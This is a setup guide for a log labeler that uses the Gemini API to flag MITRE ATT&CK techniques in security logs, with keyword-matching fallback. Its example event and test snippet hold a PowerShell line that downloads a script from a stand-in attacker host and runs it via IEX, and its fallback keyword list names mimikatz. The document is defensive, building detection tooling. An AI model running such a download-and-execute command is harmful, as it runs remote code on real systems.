# Gemini AI Integration - Setup Guide

## What Changed

Your Log Labeler now uses **Gemini AI** (free) to intelligently detect MITRE ATT&CK techniques instead of simple pattern matching. This provides much better accuracy and reasoning for each detection.

## Files Updated

### 1. `mitre_detector.py` - Completely Rewritten
- **Before**: Pattern-based detection with regex rules
- **After**: Gemini AI analysis with fallback to patterns
- **New Functions**:
  - `analyze_with_gemini(event)`: Calls Gemini API to analyze log events
  - `fallback_detection(event)`: Simple pattern matching when Gemini unavailable
  - AI provides: label, mitre_techniques, and reasoning

### 2. `requirements.txt` - Added Gemini SDK
```
google-api-python-client==2.108.0
google-auth-oauthlib==1.2.0
google-generativeai==0.3.2  <-- NEW
python-dotenv==1.0.0
```

### 3. `.env` - Added API Key
```
GEMINI_API_KEY=your_gemini_api_key_here
```

### 4. `README.md` - Updated Documentation
- Instructions for getting free Gemini API key
- Explanation of how AI analysis works
- Fallback behavior documentation

## Next Steps - Action Required!

### 1. Get Your FREE Gemini API Key

1. Go to: https://makersuite.google.com/app/apikey
2. Sign in with your Google account
3. Click "Create API Key"
4. Copy the key

### 2. Add API Key to `.env`

Edit `e:\Hacking\Mitre-Dataset\Log Labeler\.env`:

```
GEMINI_API_KEY=YOUR_ACTUAL_KEY_HERE
```

Replace `your_gemini_api_key_here` with your real API key!

### 3. Test the System

```bash
cd "e:\Hacking\Mitre-Dataset\Log Labeler"
python main.py
```

## How It Works

### Gemini AI Prompt

For each log event, the system sends this to Gemini:

```
You are a cybersecurity expert analyzing log events for potential threats.
Analyze the following log event and determine:
1. Label: Is this "normal" or "suspicious" activity?
2. MITRE ATT&CK Techniques: List any applicable technique IDs
3. Reasoning: Brief explanation of your assessment

[MITRE technique reference]

Log Event:
{your log event JSON}

Respond in JSON format:
{
    "label": "normal" or "suspicious",
    "mitre_techniques": ["T1XXX.XXX", ...],
    "reasoning": "explanation"
}
```

### Example Response

**Input Event:**
```json
{
  "timestamp": "2025-01-01T12:34:56",
  "process": "powershell.exe",
  "command": "Invoke-WebRequest https://malicious.com/payload.ps1 | IEX"
}
```

**Gemini's Analysis:**
```json
{
  "label": "suspicious",
  "mitre_techniques": ["T1059.001", "T1071.001", "T1105"],
  "reasoning": "PowerShell downloading and executing external script. T1059.001 (PowerShell), T1071.001 (Web Protocol C2), T1105 (Ingress Tool Transfer)"
}
```

## Fallback Behavior

If Gemini API fails (no key, rate limit, error), the system automatically uses pattern-based detection:

- Searches for keywords: "powershell", "mimikatz", "dropbox.com", etc.
- Assigns techniques based on keyword matches
- Still works, just less intelligent

## API Limits (Free Tier)

- **60 requests per minute**
- **No credit card required**
- Perfect for your use case

If you process more than 60 events per minute, some will use fallback detection.

## Comparison: Before vs After

### Before (Pattern Matching)
```python
if 'powershell' in event:
    techniques = ['T1059.001']
```
- ❌ Simple keyword search
- ❌ No context understanding
- ❌ Many false positives

### After (Gemini AI)
```python
result = gemini.analyze(event)
# AI understands context
# AI explains reasoning
# AI identifies multiple related techniques
```
- ✅ Understands context
- ✅ Provides reasoning
- ✅ More accurate
- ✅ Identifies technique combinations

## Testing

Test with a suspicious event:

```python
from mitre_detector import detect_mitre_techniques

event = {
    "process": "powershell.exe",
    "command": "Invoke-WebRequest https://evil.com/payload.ps1 | IEX"
}

result = detect_mitre_techniques(event)
print(result)
# {
#   "label": "suspicious",
#   "mitre_techniques": ["T1059.001", "T1071.001"],
#   "reasoning": "PowerShell downloading script from web..."
# }
```

## Troubleshooting

### "Import google.generativeai could not be resolved"
✅ Already installed! Just VS Code lint error, ignore it.

### "Gemini API error: API key not valid"
- Check `.env` file
- Make sure you replaced `your_gemini_api_key_here` with actual key
- No spaces or quotes around the key

### "Gemini API error: Resource has been exhausted"
- You hit the 60 requests/minute limit
- System automatically falls back to pattern detection
- Wait a minute and try again

### "Using fallback detection"
- No API key configured
- Using pattern-based detection (still works!)

## Cost

**FREE** - Gemini AI has a generous free tier:
- 60 requests per minute
- No credit card needed
- Perfect for this project

## Summary

Your Log Labeler is now **AI-powered**! 🚀

**Before:** Simple keyword matching
**After:** Intelligent AI analysis with reasoning

Just add your API key and run `python main.py`!
